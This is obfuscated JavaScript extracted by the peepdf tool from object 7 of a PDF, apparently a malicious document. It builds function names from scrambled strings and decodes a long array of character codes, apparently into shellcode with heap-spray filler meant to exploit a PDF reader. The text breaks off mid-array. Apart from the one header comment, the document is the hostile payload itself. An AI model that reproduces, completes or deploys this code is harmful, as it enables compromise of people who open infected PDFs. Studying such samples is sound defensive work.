// peepdf comment: Javascript code located in object 7 (version 0)

var cjlrtu = true;
eotu = false;
fhny = '';
bdeimp = true;
ahst = "";
hmez = '';
qrzlg = '';
bjnrx = 60003;
jkln = 40588;
gnot = true;
ijpuy = "";
ehkmp = true;
cequwx = "cequwx";
iopqy = '';
egntw = false;
var eijlno = '',
    bdfjqx = '',
    hlxy = "hlxy",
    gnouw = 34618,
    ckpqu = 50538,
    dpqsuv = 0,
    hkopqy = String,
    npux = hkopqy['fBrXoBmXCWhAaArBCXoBdBeX'.replace(/[XWBAM]/g, '')],
    abefl = String,
    jlmruw = abefl['etvta9lF'.replace(/[Ft9fw]/g, '')],
    ejkt = "32",
    mdrzst = "",
    bcovxy = [64, 60, 60, 152, 168, 160, 150, 166, 156, 161, 161, 82, 153, 155, 171, 145, 156, 166, 91, 171, 148, 164, 166, 162, 95, 82, 159, 151, 161, 91, 174, 63, 61, 59, 60, 169, 155, 155, 159, 151, 83, 90, 172, 147, 165, 165, 163, 96, 159, 151, 161, 153, 167, 154, 83, 92, 83, 100, 83, 110, 83, 158, 152, 160, 92, 173, 64, 60, 60, 59, 60, 171, 148, 164, 166, 162, 83, 93, 112, 82, 172, 147, 165, 165, 163, 109, 64, 60, 60, 59, 176, 63, 61, 59, 60, 171, 148, 164, 166, 162, 83, 111, 83, 171, 148, 164, 166, 162, 97, 165, 168, 148, 166, 166, 165, 155, 161, 153, 91, 98, 95, 82, 159, 151, 161, 97, 101, 91, 110, 63, 61, 59, 60, 164, 152, 166, 168, 164, 161, 82, 172, 147, 165, 165, 163, 109, 64, 60, 60, 175, 64, 60, 64, 60, 60, 152, 168, 160, 150, 166, 156, 161, 161, 82, 168, 166, 156, 158, 146, 162, 165, 155, 161, 166, 153, 90, 92, 173, 64, 60, 60, 59, 169, 147, 165, 82, 163, 147, 172, 158, 162, 147, 151, 82, 112, 82, 168, 160, 152, 165, 150, 147, 163, 151, 91, 84, 88, 167, 120, 116, 120, 107, 88, 167, 99, 98, 99, 99, 88, 167, 104, 104, 99, 98, 88, 167, 116, 99, 105, 102, 88, 167, 99, 98, 102, 98, 88, 167, 99, 98, 99, 98, 88, 167, 103, 98, 107, 116, 88, 167, 107, 116, 99, 117, 88, 167, 100, 117, 106, 98, 88, 167, 107, 116, 116, 118, 88, 167, 99, 106, 103, 98, 88, 167, 118, 101, 104, 119, 88, 167, 107, 116, 104, 103, 88, 167, 107, 116, 120, 117, 88, 167, 99, 106, 103, 103, 88, 167, 102, 101, 104, 100, 88, 167, 118, 99, 119, 100, 88, 167, 99, 101, 118, 100, 88, 167, 100, 98, 102, 100, 88, 167, 107, 98, 103, 98, 88, 167, 99, 98, 102, 106, 88, 167, 121, 103, 106, 103, 88, 167, 118, 100, 107, 116, 88, 167, 104, 118, 104, 115, 88, 167, 99, 102, 118, 100, 88, 167, 104, 103, 99, 98, 88, 167, 120, 117, 107, 116, 88, 167, 104, 99, 104, 99, 88, 167, 104, 104, 104, 101, 88, 167, 105, 98, 104, 105, 88, 167, 104, 118, 107, 116, 88, 167, 102, 101, 99, 106, 88, 167, 107, 116, 118, 98, 88, 167, 99, 117, 106, 103, 88, 167, 121, 119, 107, 116, 88, 167, 106, 104, 99, 101, 88, 167, 107, 116, 102, 117, 88, 167, 106, 106, 103, 119, 88, 167, 118, 120, 99, 101, 88, 167, 104, 99, 107, 116, 88, 167, 104, 100, 100, 117, 88, 167, 104, 99, 107, 116, 88, 167, 104, 100, 101, 102, 88, 167, 106, 99, 107, 116, 88, 167, 103, 119, 100, 102, 88, 167, 106, 103, 107, 107, 88, 167, 107, 116, 121, 117, 88, 167, 101, 98, 106, 99, 88, 167, 121, 105, 99, 101, 88, 167, 103, 115, 108, 107, 88, 167, 103, 100, 116, 118, 88, 167, 102, 116, 105, 98, 88, 167, 121, 117, 104, 103, 88, 167, 99, 102, 106, 103, 88, 167, 118, 98, 102, 101, 88, 167, 102, 105, 120, 116, 88, 167, 121, 120, 102, 101, 88, 167, 103, 103, 99, 101, 88, 167, 108, 105, 99, 117, 88, 167, 118, 120, 107, 116, 88, 167, 106, 103, 116, 119, 88, 167, 101, 116, 121, 118, 88, 167, 103, 120, 121, 107, 88, 167, 120, 106, 104, 99, 88, 167, 121, 120, 108, 102, 88, 167, 121, 120, 121, 120, 88, 167, 118, 101, 102, 116, 88, 167, 106, 102, 105, 99, 88, 167, 120, 116, 99, 100, 88, 167, 107, 116, 119, 107, 88, 167, 99, 117, 103, 103, 88, 167, 104, 119, 108, 100, 88, 167, 121, 100, 99, 101, 88, 167, 120, 98, 119, 99, 88, 167, 118, 104, 99, 101, 88, 167, 118, 107, 102, 101, 88, 167, 117, 105, 99, 120, 88, 167, 104, 120, 99, 106, 88, 167, 120, 99, 118, 99, 88, 167, 99, 101, 99, 100, 88, 167, 99, 101, 118, 115, 88, 167, 107, 116, 118, 120, 88, 167, 99, 101, 99, 99, 88, 167, 107, 107, 118, 100, 88, 167, 121, 106, 103, 103, 88, 167, 107, 116, 105, 99, 88, 167, 121, 106, 103, 103, 88, 167, 104, 119, 104, 120, 88, 167, 118, 107, 104, 116, 88, 167, 104, 103, 118, 101, 88, 167, 120, 117, 107, 116, 88, 167, 120, 106, 104, 99, 88, 167, 121, 120, 103, 107, 88, 167, 121, 120, 121, 120, 88, 167, 105, 106, 104, 98, 88, 167, 105, 98, 120, 106, 88, 167, 99, 102, 117, 120, 88, 167, 105, 117, 120, 106, 88, 167, 121, 120, 121, 120, 88, 167, 102, 101, 121, 120, 88, 167, 104, 100, 119, 100, 88, 167, 121, 120, 104, 100, 88, 167, 99, 106, 106, 103, 88, 167, 119, 98, 121, 120, 88, 167, 103, 103, 107, 107, 88, 167, 107, 116, 121, 117, 88, 167, 121, 117, 103, 103, 88, 167, 118, 101, 118, 107, 88, 167, 107, 116, 104, 103, 88, 167, 107, 101, 120, 117, 88, 167, 99, 117, 120, 117, 88, 167, 103, 103, 107, 118, 88, 167, 104, 98, 121, 102, 88, 167, 103, 103, 118, 104, 88, 167, 106, 103, 121, 102, 88, 167, 103, 103, 118, 104, 88, 167, 106, 100, 121, 103, 88, 167, 103, 103, 118, 104, 88, 167, 105, 117, 121, 104, 88, 167, 103, 103, 118, 104, 88, 167, 105, 118, 121, 105, 88, 167, 103, 103, 118, 104, 88, 167, 105, 120, 121, 106, 88, 167, 103, 103, 118, 104, 88, 167, 105, 119, 121, 107, 88, 167, 103, 103, 118, 104, 88, 167, 101, 119, 121, 115, 88, 167, 103, 103, 118, 104, 88, 167, 105, 102, 121, 116, 88, 167, 103, 103, 118, 104, 88, 167, 105, 117, 121, 117, 88, 167, 103, 103, 118, 104, 88, 167, 105, 117, 121, 118, 88, 167, 103, 103, 118, 104, 88, 167, 99, 98, 121, 119, 88, 167, 116, 98, 120, 106, 88, 167, 121, 120, 121, 120, 88, 167, 104, 98, 121, 120, 88, 167, 104, 118, 105, 106, 88, 167, 100, 99, 107, 115, 88, 167, 120, 106, 100, 104, 88, 167, 121, 120, 100, 103, 88, 167, 121, 120, 121, 120, 88, 167, 118, 102, 107, 101, 88, 167, 107, 103, 99, 117, 88, 167, 106, 102, 118, 98, 88, 167, 105, 115, 100, 103, 88, 167, 105, 115, 99, 98, 88, 167, 121, 120, 99, 98, 88, 167, 99, 117, 106, 103, 88, 167, 106, 103, 121, 120, 88, 167, 105, 115, 99, 106, 88, 167, 121, 120, 99, 98, 88, 167, 107, 103, 119, 98, 88, 167, 106, 103, 118, 98, 88, 167, 103, 98, 99, 101, 88, 167, 118, 101, 118, 107, 88, 167, 118, 98, 102, 101, 88, 167, 118, 101, 118, 107, 88, 167, 102, 101, 104, 105, 88, 167, 107, 116, 118, 98, 88, 167, 101, 102, 103, 117, 88, 167, 107, 116, 99, 117, 88, 167, 101, 102, 106, 117, 88, 167, 121, 117, 99, 106, 88, 167, 116, 115, 121, 101, 88, 167, 118, 101, 104, 120, 88, 167, 103, 117, 107, 116, 88, 167, 99, 102, 101, 102, 88, 167, 102, 107, 107, 98, 88, 167, 107, 116, 99, 98, 88, 167, 106, 102, 118, 99, 88, 167, 103, 98, 99, 104, 88, 167, 102, 106, 107, 98, 88, 167, 106, 103, 99, 98, 88, 167, 101, 116, 121, 115, 88, 167, 118, 101, 118, 99, 88, 167, 107, 116, 104, 103, 88, 167, 107, 101, 120, 117, 88, 167, 105, 102, 120, 117, 88, 167, 107, 118, 104, 101, 88, 167, 121, 98, 103, 103, 88, 167, 102, 101, 104, 105, 88, 167, 104, 98, 119, 116, 88, 167, 103, 103, 118, 104, 88, 167, 105, 116, 121, 98, 88, 167, 103, 103, 118, 104, 88, 167, 105, 103, 121, 99, 88, 167, 103, 103, 118, 104, 88, 167, 106, 100, 121, 100, 88, 167, 103, 103, 118, 104, 88, 167, 105, 119, 121, 101, 88, 167, 103, 103, 118, 104, 88, 167, 105, 103, 121, 102, 88, 167, 103, 103, 118, 104, 88, 167, 105, 117, 121, 103, 88, 167, 103, 103, 118, 104, 88, 167, 102, 101, 121, 104, 88, 167, 103, 103, 118, 104, 88, 167, 102, 100, 121, 105, 88, 167, 103, 103, 118, 104, 88, 167, 101, 119, 121, 106, 88, 167, 103, 103, 118, 104, 88, 167, 105, 102, 121, 107, 88, 167, 103, 103, 118, 104, 88, 167, 105, 117, 121, 115, 88, 167, 103, 103, 118, 104, 88, 167, 105, 117, 121, 116, 88, 167, 104, 118, 107, 106, 88, 167, 120, 106, 121, 117, 88, 167, 121, 120, 99, 116, 88, 167, 121, 120, 121, 120, 88, 167, 105, 106, 104, 98, 88, 167, 103, 101, 105, 106, 88, 167, 107, 119, 121, 107, 88, 167, 107, 98, 120, 106, 88, 167, 121, 120, 121, 119, 88, 167, 107, 116, 121, 120, 88, 167, 107, 118, 121, 106, 88, 167, 108, 117, 103, 103, 88, 167, 103, 102, 105, 115, 88, 167, 120, 106, 104, 98, 88, 167, 121, 120, 106, 119, 88, 167, 121, 120, 121, 120, 88, 167, 103, 103, 107, 118, 88, 167, 105, 115, 120, 98, 88, 167, 104, 98, 100, 98, 88, 167, 106, 101, 120, 106, 88, 167, 121, 120, 121, 120, 88, 167, 107, 101, 121, 120, 88, 167, 100, 117, 118, 102, 88, 167, 103, 103, 107, 118, 88, 167, 104, 98, 120, 98, 88, 167, 103, 103, 107, 118, 88, 167, 104, 98, 108, 117, 88, 167, 104, 101, 104, 101, 88, 167, 104, 101, 104, 101, 88, 167, 104, 101, 104, 101, 88, 167, 106, 103, 121, 120, 88, 167, 118, 105, 99, 106, 88, 167, 108, 117, 103, 103, 88, 167, 99, 98, 103, 102, 88, 167, 99, 98, 99, 98, 88, 167, 121, 120, 104, 101, 88, 167, 104, 120, 119, 105, 88, 167, 117, 104, 99, 120, 88, 167, 104, 116, 118, 98, 88, 167, 118, 101, 118, 107, 88, 167, 107, 116, 104, 103, 88, 167, 104, 99, 120, 117, 88, 167, 104, 101, 104, 99, 88, 167, 104, 105, 104, 104, 88, 167, 103, 100, 105, 115, 88, 167, 106, 100, 120, 106, 88, 167, 99, 98, 99, 98, 88, 167, 107, 116, 99, 98, 88, 167, 102, 101, 119, 106, 88, 167, 107, 103, 121, 104, 88, 167, 104, 107, 119, 116, 88, 167, 103, 103, 118, 105, 88, 167, 105, 99, 121, 106, 88, 167, 105, 103, 101, 119, 88, 167, 118, 105, 106, 106, 88, 167, 121, 117, 103, 103, 88, 167, 99, 98, 105, 103, 88, 167, 99, 98, 99, 98, 88, 167, 104, 104, 106, 119, 88, 167, 103, 103, 107, 118, 88, 167, 104, 98, 121, 106, 88, 167, 120, 106, 104, 104, 88, 167, 99, 98, 104, 99, 88, 167, 99, 98, 99, 98, 88, 167, 104, 98, 104, 107, 88, 167, 117, 99, 120, 106, 88, 167, 121, 120, 121, 119, 88, 167, 107, 103, 121, 120, 88, 167, 104, 107, 118, 98, 88, 167, 106, 102, 104, 107, 88, 167, 107, 118, 102, 107, 88, 167, 99, 99, 103, 104, 88, 167, 120, 106, 104, 98, 88, 167, 99, 98, 102, 116, 88, 167, 99, 98, 99, 98, 88, 167, 121, 106, 107, 116, 88, 167, 103, 103, 107, 118, 88, 167, 104, 98, 121, 106, 88, 167, 101, 99, 120, 106, 88, 167, 121, 120, 121, 120, 88, 167, 107, 103, 121, 120, 88, 167, 104, 107, 118, 98, 88, 167, 106, 102, 104, 107, 88, 167, 104, 105, 99, 117, 88, 167, 99, 99, 120, 106, 88, 167, 121, 120, 121, 120, 88, 167, 104, 107, 121, 120, 88, 167, 103, 102, 118, 104, 88, 167, 121, 120, 102, 106, 88, 167, 104, 98, 106, 101, 88, 167, 103, 103, 107, 118, 88, 167, 121, 119, 121, 106, 88, 167, 104, 106, 99, 98, 88, 167, 103, 103, 107, 118, 88, 167, 104, 98, 121, 106, 88, 167, 120, 106, 104, 105, 88, 167, 121, 119, 106, 102, 88, 167, 121, 120, 121, 120, 88, 167, 104, 107, 104, 107, 88, 167, 103, 104, 103, 104, 88, 167, 121, 101, 102, 116, 88, 167, 116, 115, 106, 117, 88, 167, 104, 119, 104, 120, 88, 167, 118, 107, 104, 116, 88, 167, 104, 103, 118, 101, 88, 167, 120, 117, 107, 116, 88, 167, 104, 101, 104, 99, 88, 167, 105, 98, 105, 104, 88, 167, 102, 100, 117, 99, 88, 167, 99, 98, 120, 106, 88, 167, 99, 98, 99, 98, 88, 167, 104, 106, 99, 98, 88, 167, 99, 106, 102, 106, 88, 167, 99, 101, 106, 102, 88, 167, 120, 116, 103, 98, 88, 167, 103, 98, 121, 107, 88, 167, 104, 118, 107, 116, 88, 167, 107, 98, 99, 106, 88, 167, 103, 100, 121, 116, 88, 167, 99, 106, 106, 103, 88, 167, 119, 116, 102, 101, 88, 167, 100, 106, 107, 115, 88, 167, 118, 101, 107, 116, 88, 167, 100, 105, 120, 116, 88, 167, 100, 106, 102, 106, 88, 167, 100, 99, 106, 104, 88, 167, 102, 101, 103, 98, 88, 167, 107, 102, 118, 107, 88, 167, 106, 102, 119, 116, 88, 167, 103, 98, 99, 117, 88, 167, 99, 106, 102, 106, 88, 167, 121, 116, 106, 103, 88, 167, 121, 119, 103, 98, 88, 167, 120, 116, 118, 116, 88, 167, 102, 101, 121, 100, 88, 167, 107, 107, 118, 98, 88, 167, 121, 117, 103, 103, 88, 167, 103, 103, 107, 116, 88, 167, 104, 116, 121, 117, 88, 167, 118, 101, 118, 107, 88, 167, 99, 100, 102, 100, 88, 167, 106, 102, 105, 106, 88, 167, 106, 98, 106, 102, 88, 167, 101, 120, 102, 115, 88, 167, 105, 120, 101, 120, 88, 167, 106, 103, 106, 107, 88, 167, 105, 117, 105, 119, 88, 167, 105, 119, 105, 99, 88, 167, 101, 119, 105, 102, 88, 167, 106, 100, 105, 120, 88, 167, 101, 120, 105, 105, 88, 167, 106, 100, 105, 104, 88, 167, 105, 105, 105, 99, 88, 167, 106, 101, 106, 103, 88, 167, 105, 106, 101, 120, 88, 167, 105, 117, 105, 115, 88, 167, 106, 100, 105, 119, 88, 167, 102, 100, 106, 104, 88, 167, 105, 103, 101, 119, 88, 167, 105, 103, 106, 106, 88, 167, 105, 106, 99, 98, 88, 167, 106, 102, 106, 102, 88, 167, 102, 115, 106, 98, 88, 167, 101, 120, 101, 120, 88, 167, 106, 107, 105, 120, 88, 167, 105, 119, 106, 103, 88, 167, 105, 99, 105, 117, 88, 167, 105, 102, 105, 119, 88, 167, 105, 120, 101, 119, 88, 167, 105, 105, 106, 100, 88, 167, 105, 104, 101, 120, 88, 167, 105, 99, 106, 100, 88, 167, 106, 103, 105, 105, 88, 167, 101, 120, 106, 101, 88, 167, 105, 117, 105, 101, 88, 167, 105, 101, 105, 107, 88, 167, 101, 119, 105, 116, 88, 167, 105, 106, 106, 98, 88, 167, 102, 120, 106, 98, 88, 167, 102, 118, 106, 100, 88, 167, 99, 98, 99, 98, 85, 91, 110, 63, 61, 59, 60, 168, 148, 164, 83, 160, 162, 162, 83, 111, 83, 167, 161, 151, 166, 149, 148, 162, 152, 90, 85, 87, 168, 98, 116, 98, 116, 87, 168, 98, 116, 98, 116, 87, 168, 98, 116, 98, 116, 87, 168, 98, 116, 98, 116, 84, 92, 63, 61, 59, 60, 168, 148, 164, 83, 154, 152, 147, 163, 148, 159, 161, 150, 157, 83, 111, 83, 160, 162, 162, 83, 93, 83, 162, 148, 171, 159, 161, 148, 150, 110, 63, 61, 59, 60, 168, 148, 164, 83, 148, 156, 153, 149, 158, 162, 149, 158, 82, 112, 82, 168, 160, 152, 165, 150, 147, 163, 151, 91, 84, 88, 167, 99, 115, 99, 115, 88, 167, 99, 115, 99, 115, 85, 91, 110, 63, 61, 59, 60, 168, 148, 164, 83, 154, 152, 147, 151, 151, 165, 165, 156, 172, 152, 82, 112, 82, 101, 98, 110, 63, 61, 59, 60, 168, 148, 164, 83, 165, 163, 164, 148, 171, 83, 111, 83, 154, 152, 147, 151, 151, 165, 165, 156, 172, 152, 82, 94, 82, 155, 151, 148, 162, 149, 158, 162, 149, 158, 96, 159, 151, 161, 153, 167, 154, 110, 63, 61, 59, 60, 169, 155, 155, 159, 151, 83, 90, 149, 155, 154, 148, 159, 161, 150, 157, 97, 158, 152, 160, 154, 166, 155, 82, 111, 82, 166, 162, 165, 147, 172, 91, 174, 63, 61, 59, 60, 59, 149, 155, 154, 148, 159, 161, 150, 157, 83, 93, 112, 82, 149, 155, 154, 148, 159, 161, 150, 157, 110, 63, 61, 59, 60, 175, 64, 60, 60, 59, 169, 147, 165, 82, 153, 155, 159, 158, 149, 158, 162, 149, 158, 82, 112, 82, 149, 155, 154, 148, 159, 161, 150, 157, 97, 165, 168, 148, 166, 166, 165, 155, 161, 153, 91, 98, 95, 82, 166, 162, 165, 147, 172, 91, 110, 63, 61, 59, 60, 168, 148, 164, 83, 148, 159, 161, 150, 157, 83, 111, 83, 148, 156, 153, 149, 158, 162, 149, 158, 96, 166, 167, 149, 165, 167, 164, 156, 160, 154, 90, 99, 94, 83, 148, 156, 153, 149, 158, 162, 149, 158, 96, 159, 151, 161, 153, 167, 154, 96, 165, 163, 164, 148, 171, 92, 109, 64, 60, 60, 59, 170, 154, 156, 158, 152, 82, 91, 148, 159, 161, 150, 157, 97, 158, 152, 160, 154, 166, 155, 93, 166, 162, 165, 147, 172, 82, 111, 82, 99, 170, 103, 98, 99, 98, 99, 91, 174, 63, 61, 59, 60, 59, 149, 158, 162, 149, 158, 82, 112, 82, 149, 158, 162, 149, 158, 82, 94, 82, 149, 158, 162, 149, 158, 82, 94, 82, 153, 155, 159, 158, 149, 158, 162, 149, 158, 109, 64, 60, 60, 59, 176, 63, 61, 59, 60, 168, 148, 164, 83, 159, 152, 159, 146, 147, 165, 164, 148, 171, 83, 111, 83, 160, 152, 169, 83, 115, 165, 164, 148, 171, 91, 91, 110, 63, 61, 59, 60, 152, 162, 164, 83, 90, 169, 147, 165, 82, 156, 82, 112, 82, 99, 109, 83, 155, 83, 110, 83, 99, 103, 98, 99, 109, 83, 155, 94, 93, 92, 173, 64, 60, 60, 59, 60, 159, 152, 159, 146, 147, 165, 164, 148, 171, 142, 155, 144, 82, 112, 82, 149, 158, 162, 149, 158, 82, 94, 82, 155, 151, 148, 162, 149, 158, 162, 149, 158, 109, 64, 60, 60, 59, 176, 63, 61, 59, 60, 168, 148, 164, 83, 160, 168, 159, 83, 111, 83, 99, 101, 107, 108, 107, 108, 107, 108, 107, 108, 107, 108, 107, 108, 107, 108, 107, 108, 107, 108, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 106, 107, 109, 64, 60, 60, 59, 168, 166, 156, 158, 97, 162, 165, 155, 161, 166, 153, 90, 85, 87, 103, 103, 99, 98, 99, 152, 85, 94, 83, 160, 168, 159, 92, 109, 64, 60, 60, 175, 64, 60, 64, 60, 60, 152, 168, 160, 150, 166, 156, 161, 161, 82, 150, 161, 159, 158, 148, 148, 146, 151, 160, 147, 156, 158, 91, 91, 174, 63, 61, 59, 60, 168, 148, 164, 83, 165, 155, 151, 159, 158, 150, 161, 151, 151, 83, 111, 83, 167, 161, 151, 166, 149, 148, 162, 152, 90, 85, 87, 168, 119, 117, 119, 108, 87, 168, 98, 99, 98, 100, 87, 168, 103, 105, 98, 99, 87, 168, 115, 100, 104, 103, 87, 168, 98, 99, 101, 99, 87, 168, 98, 99, 98, 99, 87, 168, 102, 99, 106, 117, 87, 168, 106, 117, 98, 118, 87, 168, 99, 118, 105, 99, 87, 168, 106, 117, 115, 119, 87, 168, 98, 107, 102, 99, 87, 168, 117, 102, 103, 120, 87, 168, 106, 117, 103, 104, 87, 168, 106, 117, 119, 118, 87, 168, 98, 107, 102, 104, 87, 168, 101, 102, 103, 101, 87, 168, 117, 100, 118, 101, 87, 168, 98, 102, 117, 101, 87, 168, 99, 99, 101, 101, 87, 168, 106, 99, 102, 99, 87, 168, 98, 99, 101, 107, 87, 168, 120, 104, 105, 104, 87, 168, 117, 101, 106, 117, 87, 168, 103, 119, 103, 116, 87, 168, 98, 103, 117, 101, 87, 168, 103, 104, 98, 99, 87, 168, 119, 118, 106, 117, 87, 168, 103, 100, 103, 100, 87, 168, 103, 105, 103, 102, 87, 168, 104, 99, 103, 106, 87, 168, 103, 119, 106, 117, 87, 168, 101, 102, 98, 107, 87, 168, 106, 117, 117, 99, 87, 168, 98, 118, 105, 104, 87, 168, 120, 120, 106, 117, 87, 168, 105, 105, 98, 102, 87, 168, 106, 117, 101, 118, 87, 168, 105, 107, 102, 120, 87, 168, 117, 121, 98, 102, 87, 168, 103, 100, 106, 117, 87, 168, 103, 101, 99, 118, 87, 168, 103, 100, 106, 117, 87, 168, 103, 101, 100, 103, 87, 168, 105, 100, 106, 117, 87, 168, 102, 120, 99, 103, 87, 168, 105, 104, 106, 108, 87, 168, 106, 117, 120, 118, 87, 168, 100, 99, 105, 100, 87, 168, 120, 106, 98, 102, 87, 168, 102, 116, 107, 108, 87, 168, 102, 101, 115, 119, 87, 168, 101, 117, 104, 99, 87, 168, 120, 118, 103, 104, 87, 168, 98, 103, 105, 104, 87, 168, 117, 99, 101, 102, 87, 168, 101, 106, 119, 117, 87, 168, 120, 121, 101, 102, 87, 168, 102, 104, 98, 102, 87, 168, 107, 106, 98, 118, 87, 168, 117, 121, 106, 117, 87, 168, 105, 104, 115, 120, 87, 168, 100, 117, 120, 119, 87, 168, 102, 121, 120, 108, 87, 168, 119, 107, 103, 100, 87, 168, 120, 121, 107, 103, 87, 168, 120, 121, 120, 121, 87, 168, 117, 102, 101, 117, 87, 168, 105, 103, 104, 100, 87, 168, 119, 117, 98, 101, 87, 168, 106, 117, 118, 108, 87, 168, 98, 118, 102, 104, 87, 168, 103, 120, 107, 101, 87, 168, 120, 101, 98, 102, 87, 168, 119, 99, 118, 100, 87, 168, 117, 105, 98, 102, 87, 168, 117, 108, 101, 102, 87, 168, 116, 106, 98, 121, 87, 168, 103, 121, 98, 107, 87, 168, 119, 100, 117, 100, 87, 168, 98, 102, 98, 101, 87, 168, 98, 102, 117, 116, 87, 168, 106, 117, 117, 121, 87, 168, 98, 102, 98, 100, 87, 168, 106, 108, 117, 101, 87, 168, 120, 107, 102, 104, 87, 168, 106, 117, 104, 100, 87, 168, 120, 107, 102, 104, 87, 168, 103, 120, 103, 121, 87, 168, 117, 108, 103, 117, 87, 168, 103, 104, 117, 102, 87, 168, 119, 118, 106, 117, 87, 168, 119, 107, 103, 100, 87, 168, 120, 121, 102, 108, 87, 168, 120, 121, 120, 121, 87, 168, 104, 107, 103, 99, 87, 168, 104, 99, 119, 107, 87, 168, 98, 103, 116, 121, 87, 168, 104, 118, 119, 107, 87, 168, 120, 121, 120, 121, 87, 168, 101, 102, 120, 121, 87, 168, 103, 101, 118, 101, 87, 168, 120, 121, 103, 101, 87, 168, 98, 107, 105, 104, 87, 168, 118, 99, 120, 121, 87, 168, 102, 104, 106, 108, 87, 168, 106, 117, 120, 118, 87, 168, 120, 118, 102, 104, 87, 168, 117, 102, 117, 108, 87, 168, 106, 117, 103, 104, 87, 168, 106, 102, 119, 118, 87, 168, 98, 118, 119, 118, 87, 168, 102, 104, 106, 119, 87, 168, 103, 99, 120, 103, 87, 168, 102, 104, 117, 105, 87, 168, 105, 104, 120, 103, 87, 168, 102, 104, 117, 105, 87, 168, 105, 101, 120, 104, 87, 168, 102, 104, 117, 105, 87, 168, 104, 118, 120, 105, 87, 168, 102, 104, 117, 105, 87, 168, 104, 119, 120, 106, 87, 168, 102, 104, 117, 105, 87, 168, 104, 121, 120, 107, 87, 168, 102, 104, 117, 105, 87, 168, 104, 120, 120, 108, 87, 168, 102, 104, 117, 105, 87, 168, 100, 120, 120, 116, 87, 168, 102, 104, 117, 105, 87, 168, 104, 103, 120, 117, 87, 168, 102, 104, 117, 105, 87, 168, 104, 118, 120, 118, 87, 168, 102, 104, 117, 105, 87, 168, 104, 118, 120, 119, 87, 168, 102, 104, 117, 105, 87, 168, 98, 99, 120, 120, 87, 168, 115, 99, 119, 107, 87, 168, 120, 121, 120, 121, 87, 168, 103, 99, 120, 121, 87, 168, 103, 119, 104, 107, 87, 168, 99, 100, 106, 116, 87, 168, 119, 107, 99, 105, 87, 168, 120, 121, 99, 104, 87, 168, 120, 121, 120, 121, 87, 168, 117, 103, 106, 102, 87, 168, 106, 104, 98, 118, 87, 168, 105, 103, 117, 99, 87, 168, 104, 116, 99, 104, 87, 168, 104, 116, 98, 99, 87, 168, 120, 121, 98, 99, 87, 168, 98, 118, 105, 104, 87, 168, 105, 104, 120, 121, 87, 168, 104, 116, 98, 107, 87, 168, 120, 121, 98, 99, 87, 168, 106, 104, 118, 99, 87, 168, 105, 104, 117, 99, 87, 168, 102, 99, 98, 102, 87, 168, 117, 102, 117, 108, 87, 168, 117, 99, 101, 102, 87, 168, 117, 102, 117, 108, 87, 168, 101, 102, 103, 106, 87, 168, 106, 117, 117, 99, 87, 168, 100, 103, 102, 118, 87, 168, 106, 117, 98, 118, 87, 168, 100, 103, 105, 118, 87, 168, 120, 118, 98, 107, 87, 168, 115, 116, 120, 102, 87, 168, 117, 102, 103, 121, 87, 168, 102, 118, 106, 117, 87, 168, 98, 103, 100, 103, 87, 168, 101, 108, 106, 99, 87, 168, 106, 117, 98, 99, 87, 168, 105, 103, 117, 100, 87, 168, 102, 99, 98, 105, 87, 168, 101, 107, 106, 99, 87, 168, 105, 104, 98, 99, 87, 168, 100, 117, 120, 116, 87, 168, 117, 102, 117, 100, 87, 168, 106, 117, 103, 104, 87, 168, 106, 102, 119, 118, 87, 168, 104, 103, 119, 118, 87, 168, 106, 119, 103, 102, 87, 168, 120, 99, 102, 104, 87, 168, 101, 102, 103, 106, 87, 168, 103, 99, 118, 117, 87, 168, 102, 104, 117, 105, 87, 168, 104, 117, 120, 99, 87, 168, 102, 104, 117, 105, 87, 168, 104, 104, 120, 100, 87, 168, 102, 104, 117, 105, 87, 168, 105, 101, 120, 101, 87, 168, 102, 104, 117, 105, 87, 168, 104, 120, 120, 102, 87, 168, 102, 104, 117, 105, 87, 168, 104, 104, 120, 103, 87, 168, 102, 104, 117, 105, 87, 168, 104, 118, 120, 104, 87, 168, 102, 104, 117, 105, 87, 168, 101, 102, 120, 105, 87, 168, 102, 104, 117, 105, 87, 168, 101, 101, 120, 106, 87, 168, 102, 104, 117, 105, 87, 168, 100, 120, 120, 107, 87, 168, 102, 104, 117, 105, 87, 168, 104, 103, 120, 108, 87, 168, 102, 104, 117, 105, 87, 168, 104, 118, 120, 116, 87, 168, 102, 104, 117, 105, 87, 168, 104, 118, 120, 117, 87, 168, 103, 119, 106, 107, 87, 168, 119, 107, 120, 118, 87, 168, 120, 121, 98, 117, 87, 168, 120, 121, 120, 121, 87, 168, 104, 107, 103, 99, 87, 168, 102, 102, 104, 107, 87, 168, 106, 120, 120, 108, 87, 168, 106, 99, 119, 107, 87, 168, 120, 121, 120, 120, 87, 168, 106, 117, 120, 121, 87, 168, 106, 119, 120, 107, 87, 168, 107, 118, 102, 104, 87, 168, 102, 103, 104, 116, 87, 168, 119, 107, 103, 99, 87, 168, 120, 121, 105, 120, 87, 168, 120, 121, 120, 121, 87, 168, 102, 104, 106, 119, 87, 168, 104, 116, 119, 99, 87, 168, 103, 99, 99, 